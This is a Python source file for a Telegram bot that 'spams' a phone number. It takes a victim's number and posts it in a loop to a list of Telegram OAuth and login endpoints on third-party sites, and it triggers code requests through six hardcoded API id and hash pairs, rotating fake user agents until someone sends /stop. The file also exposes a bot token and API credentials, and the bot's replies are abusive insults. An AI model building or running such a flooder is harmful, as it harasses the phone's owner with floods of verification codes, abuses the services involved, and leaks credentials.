import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from fake_useragent import UserAgent
from telethon import TelegramClient
import threading
import time
import re

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

ACCOUNTS = [
    (33788912, "175c63ac822b43d48b32776ee6b82761"),
    (33590106, "b40ac10586c1d243b6180c7f9a4feff2"),
    (39934985, "d0ff8b0d846856b0a01a99379b96e9bd"),
    (7216741, "1e85ff32d1cabb4e6e9537ae2d8218ca"),
    (31360840, "4279cc0d7ab41331200a13bf61152f4a"),
    (38299331, "fb5e560c3bda2db7541770b2294ee137")
]

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

active_spams = {}
awaiting_phone = set()

def is_phone(text):
    return bool(re.match(r'^\+?\d{7,15}$', text.strip()))

def send_code_via_tg(phone, api_id, api_hash):
    try:
        client = TelegramClient(None, api_id, api_hash)
        client.connect()
        if client.is_connected():
            client.send_code_request(phone)
        client.disconnect()
        return True
    except:
        return False

def spam_worker(chat_id, phone, stop_event):
    ua = UserAgent()
    while not stop_event.is_set():
        for endpoint in endpoints:
            if stop_event.is_set():
                break
            try:
                headers = {'user-agent': ua.random}
                data = {'phone': phone}
                requests.post(endpoint, headers=headers, data=data, timeout=10)
            except:
                pass
            time.sleep(0.8)
        if not stop_event.is_set():
            for api_id, api_hash in ACCOUNTS:
                if stop_event.is_set():
                    break
                send_code_via_tg(phone, api_id, api_hash)
                time.sleep(1)
        time.sleep(5)
    active_spams.pop(chat_id, None)
    bot.send_message(chat_id, "spam zavershen, pizdec")

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("spam", callback_data="spam"))
    bot.send_message(message.chat.id, "zdarova pidr, gotov spamat?", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "spam")
def callback_spam(call):
    bot.answer_callback_query(call.id)
    ask_phone(call.message)

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'spam')
def ask_phone(message):
    chat_id = message.chat.id
    if chat_id in active_spams:
        bot.reply_to(message, "spam uje rabotaet, ebalo zatknis' i /stop")
        return
    awaiting_phone.add(chat_id)
    bot.reply_to(message, "napishi nomer, hui, bystro")

@bot.message_handler(func=lambda m: m.chat.id in awaiting_phone and is_phone(m.text))
def start_spam(message):
    chat_id = message.chat.id
    awaiting_phone.discard(chat_id)
    if chat_id in active_spams:
        return
    phone = message.text.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    bot.reply_to(message, "drochka poehala, chtoby zakanchivat - /stop")
    stop_event = threading.Event()
    active_spams[chat_id] = stop_event
    threading.Thread(target=spam_worker, args=(chat_id, phone, stop_event)).start()

@bot.message_handler(commands=['stop'])
def stop_spam(message):
    chat_id = message.chat.id
    if chat_id in active_spams:
        active_spams[chat_id].set()
        bot.reply_to(message, "ostanavlivaem spam, suka")
    else:
        bot.reply_to(message, "net aktivnogo spama, debil")

@bot.message_handler(func=lambda m: True)
def fallback(message):
    chat_id = message.chat.id
    if chat_id in awaiting_phone:
        awaiting_phone.discard(chat_id)
        bot.reply_to(message, "nomer ne tot, ebat' tupoy")
    else:
        bot.reply_to(message, "chego nado? /start ili /stop, debil")

if __name__ == '__main__':
    bot.infinity_polling()
